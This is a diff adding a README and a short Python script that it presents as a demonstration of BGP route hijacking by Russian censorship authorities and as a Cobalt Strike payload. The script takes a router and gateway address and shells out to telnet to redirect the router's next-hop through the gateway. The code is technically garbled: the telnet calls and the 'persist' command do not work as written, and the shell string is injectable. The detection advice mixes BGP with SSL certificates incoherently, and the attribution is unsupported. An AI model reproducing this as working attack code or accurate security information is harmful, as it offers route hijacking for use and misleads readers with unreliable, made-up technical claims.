@@ -1,0 +1,49 @@
+
+README 
+
+This type of code is designed to demonstrate a vulnerability being exploited by Russian state-controlled censorship authorities that have automated the modification of path attributes configurations in a BGP router's routing table, which will allow for persistent routing through a gateway without being detected. You can detect this type of suripticious surveillance by validating the route announcements and match it to IPs with self-signed CAs and mismatched SSL certificates.
+
+The software should be run on a Linux system and requires Python 3. It is recommended to use a virtual environment to ensure compatibility of the packages used in this software.
+
+To get started: 
+1. Clone the repository 
+2. Activate the virtual environment 
+3. Install the necessary packages using the requirements.txt file 
+4. Run the program 
+
+DEVELOPER NOTES 
+
+This software was developed using Python 3. All packages used are listed in the requirements.txt file, which should be used to install the necessary packages before running the program. 
+
+The program takes the IP address of the router and the IP address of the gateway as input from the user. It then uses the telnet command to modify the path attributes configuration in the router's routing table and enable persistent routing through the gateway. 
+
+LICENSE 
+
+This software is released under the MIT License. See the LICENSE file for details.
+
+This is the same code as a subprocess that is wrapped for payload on a cobalt strike intrusion:
+
+#!/usr/bin/env python3
+
+import subprocess
+
+# Get router's IP address
+router_ip = input("Enter router's IP address: ")
+
+# Get gateway's IP address
+gateway_ip = input("Enter gateway's IP address: ")
+
+# Modify path attributes
+command = f"telnet {router_ip} config t route-map set ip next-hop {gateway_ip}"
+
+# Execute command
+subprocess.run(command, shell=True)
+
+# Enable persistent routing
+command = f"telnet {router_ip} config-route-map persist"
+
+# Execute command
+subprocess.run(command, shell=True)
+
+# Exit
+print("Routing successfully modified.")
